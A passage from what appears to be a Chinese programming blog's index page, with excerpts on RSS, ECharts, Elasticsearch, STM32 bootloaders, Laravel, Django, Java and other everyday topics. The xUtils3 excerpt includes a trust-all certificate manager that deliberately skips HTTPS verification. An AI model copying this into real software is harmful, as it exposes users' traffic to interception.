什么是Feed合烧 合烧Feed指把您多个Blog的Feed合并成一个，这样您可以让用户一次订阅您所有的内容，目前这个功能暂不开放，但是您要想把自己的网摘、照片和Blog合并，共同输出，您可以选择Feed管理里面的Feed优化。把feed聚合成一个feed，就可以实现博客校友录啦，而且管理方便，聚合上面还可聚合 Rss: 一般提供信源地址（RSS 输出）的网站都有这样的标识，点击这些标识，你就可以发现对应的信源地址（位于RSS 输出地址的一个RSS文件就是一段规范的XML数据，该文件一般以rss，xml或者rdf作为后缀。下面我们选择 http://msdn.microsoft.com/visualc/rss.xml 中的一部分作为例子简单说（略） 发布一个RSS文件（一般称为RSS Feed）后，这个RSS Feed中包含的信息就能直接被其他站点调用，而且由于这些数据都是标准的XML格式，所以也能在其他的终端和服务中使用，如PDA、手机、邮件列表等。而且一个网站联盟（比如专门讨论旅游的网站系列）也能通过互相调用彼此的RSS Feed，自动的显示网站联盟中其他站点上的最新信息，这就叫着RSS的联合。这种联合就导致一个站点的内容更新越及时、RSS Feed被调用的越多，该站点的知名度就会越高，从而形成一种良性循环。 而所谓RSS聚合，就是通过软件工具的方法从网络上搜集各种RSS Feed并在一个界面中提供给读者进行阅读。这些软件可以是在线的WEB工具，如http://du.xianguo.com，http://my.netscape.com，http://my.userland.com， http://www.xmltree.com，http://www.moreover.com，http://www.oreillynet.com/meerkat 等，也可以是下载到客户端安装的工具 RSS是站点用来和其他站点之间共享内容的一种简易方式（也叫聚合内容），通常被用于新闻和其他按顺序排列的网站，例如Blog。 一段项目的介绍可能包含新闻的全部介绍等。或者仅仅是额外的内容或者简短的介绍。这些项目的链接通常都能链接到全部的内容。网络用户可以在客户端借助于支持RSS的新闻聚合工具软件（例如SharpReader,NewzCrawler、FeedDemon），在不打开网站内容页面的情况下阅读支持RSS 输出的网站内容。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eed3121c152faba0db522ae494611a1d/" rel="bookmark">
			Echarts图表通过Ajax动态更新数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		由于业务需求需要做一个可视化的展示Demo，这个Demo需要前后端的共同支撑，所以思路大致是：首先我们想到的是用ajax动态请求服务端获取到json文件后，然后将其解析为可以直接使用的数据，最后把这些数据更新到Echarts中去。 简单的代码实现如下：
HTML：
&lt;div id="myId"&gt;&lt;div/&gt; var myChart = echarts.init(document.getElementById('myId')); // 初始化 var dispute,traffice,criminal,fire,public_sercurity; //纠纷，交通，犯罪，火情，公共安全 var receive = []; // Echarts中data使用的更新数据数组 function getCategoryPolice(){ $.ajax({ type:"GET", url:"http://10.x.x.11:8080/SSH_Backstage/demoAction", dataType:'json', async:true, beforeSend: function(){ // alert("loading...."); }, //加载执行方法 error: function(){ alert("error"); }, //错误执行方法 success: function(CategoryCon){ // 这里弹出某几项验证一下是否获取到了数据或者正确与否 /* alert("纠纷："+CategoryCon.list[0].dispute); alert("交通:"+CategoryCon.list[0].traffice); alert("刑事:"+CategoryCon.list[0].criminal); alert("火情:"+CategoryCon.list[0].fire); alert("治安:"+CategoryCon.list[0].public_sercurity); */ // 解析数据并赋值给事先声明好的变量 dispute = CategoryCon.list[0].dispute; traffice = CategoryCon.list[0].traffice; criminal = CategoryCon.list[0].criminal; fire = CategoryCon.list[0].fire; public_sercurity = CategoryCon.list[0].public_sercurity; receive = []; // 将使用的数组置空，因为我做demo时在声明数组时有实际测试的数据 // 也可以这样置空数组:receive.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/eed3121c152faba0db522ae494611a1d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a749afa35c68b563bb5f4155772b33de/" rel="bookmark">
			Xcode使用之安装ipa文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一、通过xcode安装ipa文件 1.打开xcode 2.菜单栏 ——&gt; Window ——&gt;Devices 3.点击+号，添加本地IPA文件即可 二、用命令行的方式安装ipa文件 1、首先安装libimobiledevice和ideviceinstaller $ brew uninstall ideviceinstaller $ brew uninstall libimobiledevice $ brew install --HEAD libimobiledevice $ brew link --overwrite libimobiledevice $ brew install ideviceinstaller $ brew link --overwrite ideviceinstaller 2、 安装应用（真机） $ ideviceinstaller -i xxx.ipa 3、 卸载应用（真机） $ ideviceinstaller -U &lt;bundleId&gt; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d65b19ed474e09b9e1f9e0749bd87938/" rel="bookmark">
			vim 配置 clang-format
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 在ubuntu14.04下完成配置
第一步：安装clang-format sudo apt-get install clang-format-3.x 第二步：二进制文件拷贝 拷贝一个不带版本号的二进制，实际上就是重命名
sudo cp /usr/bin/clang-format-3.x /usr/bin/clang-format 截止目前，已经可以在shell使用clang-format 例如：
clang-format main.cpp -style=LLVM 第三步：配置vim 有很多方式，我才用了官网的方式 http://clang.llvm.org/docs/ClangFormat.html
具体流程：
1）下载clang-format.py 2）在vimrc中添加 map &lt;C-K&gt; :pyf &lt;path-to-this-file&gt;/clang-format.py&lt;cr&gt; imap &lt;C-K&gt; &lt;c-o&gt;:pyf &lt;path-to-this-file&gt;/clang-format.py&lt;cr&gt; 至此完成的功能有： normal模式下，ctrl+k将格式化一行代码 visual模式下，ctrl+k将格式化选中代码 insert模式下，ctrl+k将格式化一行代码
打开一个文件，发现提示：没有.clang-format文件，默认将使用llvm风格，我们可以才当前目录下创建一个.clang-format: 这里我抄了一个腾讯的文件
--- BasedOnStyle: LLVM IndentWidth: 4 TabWidth: 4 AlwaysBreakTemplateDeclarations: true AllowShortFunctionsOnASingleLine: Inline BreakAfterJavaFieldAnnotations: true BreakBeforeBraces: Linux SpaceAfterCStyleCast: true IndentCaseLabels: true AccessModifierOffset: -4 BreakBeforeBraces: Custom BraceWrapping: AfterNamespace: false AfterClass: false AfterFunction: true BreakConstructorInitializersBeforeComma: true ConstructorInitializerAllOnOneLineOrOnePerLine: true BinPackParameters: false ReflowComments: false --- Language: Cpp ColumnLimit: 80 --- 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b180ac25866bd98d0441e1adc00e0161/" rel="bookmark">
			搭建Elasticsearch 5.4 集群
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、集群角色 es集群中的节点主要可以分为master nodes、data nodes和client node。在配置文件中使用Zen发现(Zen discovery)机制来管理不同节点。Zen发现是ES自带的默认发现机制，使用单播发现其它节点。只要启动一个新的ES节点并设置和集群相同的名称，这个节点就会被加入到集群中。
Elasticsearch集群中节点一般有三种角色:master node、data node和client node。
（1）master node。master节点主要用于元数据(metadata)的处理，比如索引的新增、删除、分片分配等。
（2）data node。data节点上保存了数据分片。它负责数据相关操作，比如分片的 CRUD，以及搜索和整合操作。这些操作都比较消耗 CPU、内存和 I/O 资源；
（3）client node。client节点起到路由请求的作用，实际上可以看做负载均衡器。( 对于没有很多请求的业务，client node可以不加，master和data足矣)。
2、多机集群配置 ELasticsearch 5.4要求JDK版本最低为1.8。现有三台服务器分别安装一个es节点，这三个节点组成一个es集群。因为是小集群，因此设置这三个节点都可作为master节点和data节点。服务器的ip分别为192.168.1.111、192.168.1.112和192.168.1.113。集群节点配置如下所示。
（1）ip为192.168.1.111的节点配置如下。
#集群名 cluster.name: my-application #节点名 node.name: node-111 #节点ip network.host: 192.168.1.111 #设置对外服务的http端口，默认为9200 http.port: 9200 #设置节点之间交互的tcp端口，默认是9300 transport.tcp.port: 9300 #是否允许跨域REST请求 http.cors.enabled: true #允许 REST 请求来自何处 http.cors.allow-origin: "*" #节点角色设置 node.master: true node.data: true #有成为主节点资格的节点列表 discovery.zen.ping.unicast.hosts: ["192.168.1.111:9300","192.168.1.112:9300","192.168.1.113:9300"] #集群中一直正常运行的，有成为master节点资格的最少节点数（默认为1） # (total number of master-eligible nodes / 2 + 1) discovery.zen.minimum_master_nodes: 2 （2）ip为192.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b180ac25866bd98d0441e1adc00e0161/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e5118acdd7de1eb2c7a0ead54b9838d5/" rel="bookmark">
			STM32串口IAP实验中的地址问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		if(((*(vu32*)(0X20001000+4))&amp;0xFF000000)==0x08000000）和if(((*(vu32*)appxaddr)&amp;0x2FFE0000)==0x20000000)分析
首先要清楚：0x8000000是Flash的起始地址，0x20000000是SRAM的起始地址。jump2app()是一个虚拟函数（函数指针）
(*(vu32*)(0X20001000+4))== (*(__IO uint32_t*)(0X20001000+4))
==(*(volatile unsigned int*)(0X20001000+4))
(*(vu32*)(0X20001000+4)) 通过内存寻址访问地址为（0x20001000 + 4)中的值
(0X20001000+4)只是一个常量；
(volatile unsigned int*)(0X20001000+4) 将0x20001000 + 4这个常量强制转化成volatile unsigned int类型的指针；
(*(volatile unsigned int*)(0X20001000+4)) 相对于取0x20001000 + 4地址处的值
程序设置把串口接收来的数据从0x20001000开始存储，第一个4个字节为栈顶地址，第二个4字节为复位中断向量的入口地址，接下来+8，将会是NMI中断服务函数的入口地址， +12，将会是HardFault的服务函数入口地址... STM32程序地址从 0X08000000 开始 执行，PC机也是从硬盘上的 0X08000000 地址开始执行。前四个字节是栈顶地址main()函数式主函数，也有个栈顶地址，其他函数一样，在调用跳转之前，将其对应的函数栈地址保存起来。 BootLoader程序先烧进Flash里，它的栈顶地址从0X08000000开始，4字节栈顶地址数据空间，然后是各种中断服务地址。。。 当收到APP程序时（它自己已经定义好了，收到APP文件后写道0X08000000+N这个地址上），它要把APP程序写到0X08000000+N上，因此，它需要首先判断一下APP程序在MDK中编译生成.bin文件后否是遵循这个0X08000000+N这个地址。如果和Bootloader要求的一样，那么就是正确的文件。
而appxaddr存放的是用户程序Flash的首地址，(*(volatile u32*)appxaddr)的意思是取用户程序首地址里面的数据，这个数据就是用户代码的堆栈地址，堆栈地址指向RAM，而RAM的起始地址是0x20000000，因此上面的判断语句执行：判断用户代码的堆栈地址是否落在:0x20000000~0x2001ffff区间中。
注：这里面的（0X20001000+4）和我们在SRAM里的起始地址 0X20001000 有什么关系呢？
我们选择0X20001000，就是留下SRAM区域的前4K SRAM给IAP程序使用。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/75a671a9c9e57adfd41368bb42c4bf2b/" rel="bookmark">
			laravel5.4开启sql调试
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		打开app\Providers\AppServiceProvider.PHP，在boot方法中添加如下内容
public function boot() { //sql调试 $sql_debug = config('database.sql_debug'); if ($sql_debug) { DB::listen(function ($sql) { foreach ($sql-&gt;bindings as $i =&gt; $binding) { if ($binding instanceof \DateTime) { $sql-&gt;bindings[$i] = $binding-&gt;format('\'Y-m-d H:i:s\''); } else { if (is_string($binding)) { $sql-&gt;bindings[$i] = "'$binding'"; } } } $query = str_replace(array('%', '?'), array('%%', '%s'), $sql-&gt;sql); $query = vsprintf($query, $sql-&gt;bindings); print_r($query); echo '&lt;br /&gt;'; }); } } 在app/config/database.php 添加
'sql_debug' =&gt; 0, //为1输出所有执行的sql语句 或者在app/helper.php函数添加 function getLastSql() { DB::listen(function ($sql) { foreach ($sql-&gt;bindings as $i =&gt; $binding) { if ($binding instanceof \DateTime) { $sql-&gt;bindings[$i] = $binding-&gt;format('\'Y-m-d H:i:s\''); } else { if (is_string($binding)) { $sql-&gt;bindings[$i] = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/75a671a9c9e57adfd41368bb42c4bf2b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0e3ddebb07c9dbead897269d97e0755f/" rel="bookmark">
			xUtils3  Https请求报错：javax.net.ssl.SSLPeerUnverifiedException: Hostname ***.****.**not verified，跳过证书检测
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用xUtils3发送https请求报错javax.net.ssl.SSLPeerUnverifiedException: Hostname ***.****.**not verified。
我想不验证证书直接进行访问（和http一样了）。
解决过程： 刚开始设置 （requestParams是参数对象）
/** 判断https证书是否成功验证 */ SSLContext sslContext = getSSLContext(MyApp.mContext); if (null == sslContext) { Utils.LogUtils("Error:Can't Get SSLContext!"); return; } requestParams.setSslSocketFactory(sslContext.getSocketFactory()); //绑定SSL证书(https请求) /** * 获取Https的证书 * * @param context Activity（fragment）的上下文 * @return SSL的上下文对象 */ private static SSLContext s_sSLContext = null; private static SSLContext getSSLContext(Context context) { try { s_sSLContext = SSLContext.getInstance("TLS"); //信任所有证书 （官方不推荐使用） s_sSLContext.init(null, new TrustManager[]{new X509TrustManager() { @Override public X509Certificate[] getAcceptedIssuers() { return null; } @Override public void checkServerTrusted(X509Certificate[] arg0, String arg1) throws CertificateException { } @Override public void checkClientTrusted(X509Certificate[] arg0, String arg1) throws CertificateException { } }}, new SecureRandom()); return s_sSLContext; } catch (Exception e) { e.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0e3ddebb07c9dbead897269d97e0755f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4aa9ac80e7b3dcb2d0aa7cfbb6480ff1/" rel="bookmark">
			EMWin窗口重绘（WM_Redraw.c）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		实例：WM_Redraw.c 效果： #include "GUI.h" #include "WM.h" static void _cbBkWindow(WM_MESSAGE* pMsg) { switch (pMsg-&gt;MsgId) { case WM_PAINT: GUI_ClearRect(0, 50, 319, 239); default: WM_DefaultProc(pMsg); } } static void _cbWindow(WM_MESSAGE* pMsg) { GUI_RECT Rect; switch (pMsg-&gt;MsgId) { case WM_PAINT: WM_GetInsideRect(&amp;Rect); GUI_SetBkColor(GUI_RED); GUI_SetColor(GUI_YELLOW); GUI_ClearRectEx(&amp;Rect); GUI_DrawRectEx(&amp;Rect); GUI_SetColor(GUI_BLACK); GUI_SetFont(&amp;GUI_Font8x16); GUI_DispStringHCenterAt("Foreground window", 75, 40); break; default: WM_DefaultProc(pMsg); } } static void _MoveWindow(const char* pText) { WM_HWIN hWnd; int i; // // Create foreground window // hWnd = WM_CreateWindow(10, 50, 150, 100, WM_CF_SHOW, _cbWindow, 0); GUI_Delay(500); // // Move foreground window // for (i = 0; i &lt; 40; i++) { WM_MoveWindow(hWnd, 2, 2); GUI_Delay(10); } // // Show text before deleting window if we have one // if (pText) { GUI_DispStringAt(pText, 5, 50); GUI_Delay(2500); } // // Delete foreground window // WM_DeleteWindow(hWnd); WM_Invalidate(WM_HBKWIN); GUI_Exec(); } static void _DemoRedraw(void) { WM_CALLBACK * _cbOldBk; GUI_SetBkColor(GUI_BLACK); GUI_Clear(); GUI_SetColor(GUI_WHITE); GUI_SetFont(&amp;GUI_Font24_ASCII); GUI_DispStringHCenterAt("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4aa9ac80e7b3dcb2d0aa7cfbb6480ff1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fef42bfda0817084e0a42c60ec6ded3c/" rel="bookmark">
			LCD显示的一些基本概念以及DSI的一些clock解释
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		数字视频的基本概念源自于模拟视频。对于模拟视频我们可以这样理解：视频可以分解为若干个基本视点（像素），每个像素都有独立的色彩信息，在屏幕上依次将 这些点用电子枪按照行和列打出来，就形成了一幅完整画面，连续的打出画面，利用人眼的延迟特点就可以“显示”动态的图像了。 水平消隐：电子枪从左到右画出象素，它每次只能画一条扫描线，画下一条之前要先回到左边并做好画下一条扫描线的准备，这之间有一段时间叫做水平消隐（HBlank）。
垂直消隐：在画完全部256条扫描线之后它又回到屏幕左上角准备下一次画屏幕（帧），这之间的一段时间就是垂直消隐（VBlank）。电子枪就是在不断的走‘之’字形。
行同步（HSYNC）：行同步就是让电子枪控制器知道下面要开始新的一行像素 场同步（VSYNC： 场同步就是告诉电子枪控制器下面要开始新的画面 数据使能（DE）： 在数据使能区是有效的色彩数据，不在使能范围内的都显示黑色。 前肩（Front Porch）/后肩 （Back Porch） ：行同步或场同步信号发出后，视频数据不能立即使能，要留出电子枪回扫的时间。以行扫描为例，从HSYNC结束到DE开始的区间成为行扫描的后肩（绿色区域），从DE结束到HSYNC开始称为前肩（紫色区域）。同样对于场扫面也可以由类似的定义。 Pixel clock：像素时脉(Pixel clock)指的是用来划分进来的影像水平线里的个别画素， Pixel clock 会将每一条水平线分成取样的样本，越高频率的 Pixel clock，每条扫瞄线会有越多的样本画素。 HFP: Horizon front porch
HBP: Horizon back porch
VFP: Vertical front porch
VBP: Vertical back porch
HDP： Horizon display period
VDP: Vertical display period
HTP = HSYNC + HDP + HFP + HBP
VTR = VSYNC + VDP + VFP + VBP
f dot _ clk = pixel clock f dot _ clk = f v * VTR * HTP f v = vertical frequency (这个是频率，平时见到的很多时候是60HZ)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fef42bfda0817084e0a42c60ec6ded3c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aa74f48f4c66b91bacfed9f33f1158b4/" rel="bookmark">
			HTML常用属性
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1：HTML Hyper Text Markup Language - 超文本标记语言。
W3c组织定义的一标准。
浏览器解析HTML。
2：HTML语法 1：文本文件，扩展名 *.html
2：语法的结构：都是元素- XML(用户自己定义的)
&lt;html&gt;
&lt;head&gt;
&lt;!--说明语法 --&gt;
&lt;title&gt;标题用于显示到浏览器的头上&lt;/title&gt;
&lt;/head&gt;
&lt;!--HTML文件的正文部分--&gt;
&lt;body&gt;
&lt;!--声明一个按扭--&gt;
&lt;button&gt;这是一个按扭&lt;/button&gt;
&lt;br&gt;&lt;!--单行的元素,用于换行--&gt;
&lt;label&gt;标签&lt;/label&gt;
&lt;br&gt;
&lt;input type="text" name="name"/&gt;
&lt;/body&gt;
&lt;/html&gt;
3：使用HBuilder开发html css是用于放样式表的。
img是用于放图片的。
Js 放用于放javascript的文件的。
Index.html 默认的主页。
4：学习HTML的元素 1：语法 （见2）
2：html的元素 &lt;!DOCTYPE html&gt; - 文档类型定义 - 约束。 这种约束版本是HTML5
&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN"
"http://www.w3.org/TR/html4/strict.dtd"&gt;
HTML4.0版本。
目前建议大家都使用HTML5的约束。
3：基本的元素 &lt;!DOCTYPE html&gt;
&lt;html&gt; &lt;!--html的根元素--&gt;
&lt;head&gt; &lt;!--头元素，标题，编码的类型都放到这儿--&gt;
&lt;meta charset="utf-8" /&gt; &lt;!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aa74f48f4c66b91bacfed9f33f1158b4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/100f33f8f966b443179e619ac50e4bf0/" rel="bookmark">
			django传值给模板, 再用JS接收并进行操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天用要django传值给模板, 然后需要用js处理一下.特此记录.
用json.dumps()方法将值传给模板.
import json return render(request,'wauth/freetime.html', {'slot_ids': json.dumps(slot_ids)})
用JSON.parse()接收django传过来的值.
var slot_ids = JSON.parse('{{ slot_ids|safe }}');
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0d17fde9d32268b3e1c32cacbb69b2f2/" rel="bookmark">
			weblogic控制台部署
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.用IE浏览器，打开管理控制台，输入管理账户用户名及密码。
2.进入控制台界面，点击左侧部署，点击右侧部署概要里面要部署“更新”的文件。（前提，用Xmanager Xftp上传本地代码到服务器）
3.进入控制台界面，点击左侧部署，如果部署文件没有安装，则在右侧部署概要里面点击看“安装“。（安装如图下所示）
4.测试地址：http://172.1.1.16:8080/api/abc // 服务器host地址：开一个端口号用于测试/路径
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/393094383034870df21726e06593b7ac/" rel="bookmark">
			电脑不识别u盘的解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当U盘插入电脑，电脑不识别u盘时的解决办法：不一定适用于所有人，操作系统win10
此电脑右键→管理→设备管理器→通用串行总线控制器→USB大容量存储设备→卸载→重新插入U盘。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b1b822c9ecf9081bea2058f70a713172/" rel="bookmark">
			类型后面三个点(String...)和数组(String[])的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 类型后面三个点(String…)，是从Java 5开始，Java语言对方法参数支持一种新写法，叫可变长度参数列表，其语法就是类型后跟…，表示此处接受的参数为0到多个Object类型的对象，或者是一个Object[]。 例如我们有一个方法叫做test(String…strings)，那么你还可以写方法test()，但你不能写test(String[] strings)，这样会出编译错误，系统提示出现重复的方法。 在使用的时候，对于test(String…strings)，你可以直接用test()去调用，标示没有参数，也可以用去test(“aaa”)，也可以用test(new String[]{“aaa”,”bbb”})。 另外如果既有test(String…strings)函数，又有test()函数，我们在调用test()时，会优先使用test()函数。只有当没有test()函数式，我们调用test()，程序才会走test(String…strings)。 public class Test003 { private Test003(){ test(); test("a","b"); test(new String[]{"aaa","bbb"}); test("ccc"); } private void test(){ System.out.println("test"); } private void test(String...strings){ for(String str:strings){ System.out.print(str + ", "); } System.out.println(); } public static void main(String[] args) { new Test003(); } } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7fcf75f464ba53cdfe6ceca5f592ef3e/" rel="bookmark">
			aspect学习（1）before&amp;after&amp;around
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		面向Aspect的编程，其实就是AOP，什么是AOP，用过学习过spring的同学都晓得。本人不喜欢也不擅长写概念，更喜欢结合例子慢慢讲解。
下面的例子是在eclipse下写的，需要先准备好环境。
准备环境
eclipse安装AJDT插件，安装插件的方法有多种，本人更喜欢在线安装。http://www.eclipse.org/ajdt/downloads/，找到和ecilpse版本相合的ajdt版本，复制update site URL连接，然后在eclipse中按照安装插件的方法安装即可。
（不会安装插件的同学，可百度，别人有贴图详细说明）。
下载aspect架包，http://www.eclipse.org/aspectj/downloads.PHP
需求一
有一Point类，有三个私有属性int x,int y , int z ，当调用setX,setY,setZ进行属性值修改前，打印通知日志。
注意：eclipse新建项目，必须选择aspectJ project
[java] view plain copy package com.fei.bean; public class Point { private int x; private int y; private int z; public Point(int x, int y, int z) { super(); this.x = x; this.y = y; this.z = z; } public int getX() { return x; } public void setX(int x) { this.x = x; } public int getY() { return y; } public void setY(int y) { this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7fcf75f464ba53cdfe6ceca5f592ef3e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a93d1bb4b99c123ffa36e8d242bd92f3/" rel="bookmark">
			Hierarchical Attention Network for Document Classification--tensorflow实现篇
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		上周我们介绍了Hierarchical Attention Network for Document Classification这篇论文的模型架构，这周抽空用tensorflow实现了一下，接下来主要从代码的角度介绍如何实现用于文本分类的HAN模型。
数据集 首先介绍一下数据集，这篇论文中使用了几个比较大的数据集，包括IMDB电影评分，yelp餐馆评价等等。选定使用yelp2013之后，一开始找数据集的时候完全处于懵逼状态，所有相关的论文和资料里面出现的数据集下载链接都指向YELP官网,但是官网上怎么都找不到相关数据的下载，然后就各种搜感觉都搜不到==然后就好不容易在github上面找到了，MDZZ，我这都是在写什么，绝对不是在凑字数，单纯的吐槽数据不好找而已。链接如下： https://github.com/rekiksab/Yelp/tree/master/yelp_challenge/yelp_phoenix_academic_dataset 这里面好像不止一个数据集，还有user，business等其他几个数据集，不过在这里用不到罢了。先来看一下数据集的格式，如下，每一行是一个评论的文本，是json格式保存的，主要有vote, user_id, review_id, stars, data, text, type, business_id几项，针对本任务，只需要使用stars评分和text评论内容即可。这里我选择先将相关的数据保存下来作为数据集。代码如下所示：
{"votes": {"funny": 0, "useful": 5, "cool": 2}, "user_id": "rLtl8ZkDX5vH5nAx9C3q5Q", "review_id": "fWKvX83p0-ka4JS3dc6E5A", "stars": 5, "date": "2011-01-26", "text": "My wife took me here on my birthday for breakfast and it was excellent. The weather was perfect which made sitting outside overlooking their grounds an absolute pleasure. Our waitress was excellent and our food arrived quickly on the semi-busy Saturday morning.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a93d1bb4b99c123ffa36e8d242bd92f3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e862cc335bb4ee9444c0c7e2159bedcf/" rel="bookmark">
			国内可用的ntp服务器地址
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ntp.sjtu.edu.cn 202.120.2.101 (上海交通大学网络中心NTP服务器地址） s1a.time.edu.cn 北京邮电大学 s1b.time.edu.cn 清华大学 s1c.time.edu.cn 北京大学 s1d.time.edu.cn 东南大学 s1e.time.edu.cn 清华大学 s2a.time.edu.cn 清华大学 s2b.time.edu.cn 清华大学 s2c.time.edu.cn 北京邮电大学 s2d.time.edu.cn 西南地区网络中心 s2e.time.edu.cn 西北地区网络中心 s2f.time.edu.cn 东北地区网络中心 s2g.time.edu.cn 华东南地区网络中心 s2h.time.edu.cn 四川大学网络管理中心 s2j.time.edu.cn 大连理工大学网络中心 s2k.time.edu.cn CERNET桂林主节点 s2m.time.edu.cn 北京大学
作为资料收集之用！
搭建NTP服务器请参考：http://www.linuxidc.com/Linux/2017-02/140875.htm
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a75d680e4d73c023a53e892b0ba38f3f/" rel="bookmark">
			什么是Bash、什么是shell？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		什么是Shell?
shell是用户和Linux（或者更准确的说，是用户和Linux内核）之间的接口程序。你在提示符下输入的每个命令都由shell先解释然后传给Linux内核。
shell 是一个命令语言解释器（command-language interpreter）。拥有自己内建的 shell 命令集。此外，shell也能被系统中其他有效的Linux 实用程序和应用程序（utilities and application programs）所调用。 不论何时你键入一个命令，它都被Linux shell所解释。一些命令，比如打印当前工作目录命令（pwd），是包含在Linux bash内部的（就象DOS的内部命令）。其他命令，比如拷贝命令（cp）和移动命令（rm），是存在于文件系统中某个目录下的单独的程序。而对用户来说，你不知道（或者可能不关心）一个命令是建立在shell内部还是一个单独的程序。
shell 首先检查命令是否是内部命令，不是的话再检查是否是一个应用程序，这里的应用程序可以是Linux本身的实用程序，比如ls rm， 然后shell试着在搜索路径($PATH)里寻找这些应用程序。搜索路径是一个能找到可执行程序的目录列表。如果你键入的命令不是一个内部命令并且在路径里没有找到这个可执行文件，将会显示一条错误信息。而如果命令被成功的找到的话，shell的内部命令或应用程序将被分解为系统调用并传给Linux内核。
The Bourne Again Shell Bourne Again shell (bash), 正如它的名字所暗示的，是 Bourne shell 的扩展。bash 与 Bourne shell 完全向后兼容，并且在 Bourne shell 的基础上增加和增强了很多特性。bash 也包含了很多 C 和 Korn shell 里的优点。bash 有很灵活和强大的编程接口，同时又有很友好的用户界面。
为什么要用 bash 来代替 sh 呢？Bourne shell 最大的缺点在于它处理用户的输入方面。在 Bourne shell 里键入命令会很麻烦，尤其当你键入很多相似的命令时。而 bash 准备了几种特性使命令的输入变得更容易。 bash 命令概要 这是几个最有用的bash内部命令： alias: 设置bash别名。 bg: 使一个被挂起的进程在后台继续执行。 cd: 改变当前工作目录。 exit: 终止shell。 export: 使变量的值对当前shell的所有子进程都可见 。 fc: 用来编辑历史命令列表里的命令。 fg: 使一个被挂起的进程在前台继续执行。 help: 显示bash内部命令的帮助信息。 kill: 终止某个进程。 pwd: 显示当前工作目录。 unalias: 删除已定义的别名。 bash 还有许多命令，但这些是最常用的，想了解更详细的情况，请参考bash的手册–在提示符下键入 man bash。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a75d680e4d73c023a53e892b0ba38f3f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/69512c83ec69014cabef8ff00e45bbbb/" rel="bookmark">
			autowire的五种方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、no：不自动装载
2、byName：根据实例变量名称自动装载
按照类中声明的实例变量的名称，与XML配置文件中声明的bean定义的beanName的值进行匹配，相匹配的bean定义将被自动绑定到当前实例变量上。这种方式对类定义和配置的bean定义有一定的限制代码如下：
public class Xxx{
private UserService userService；
}
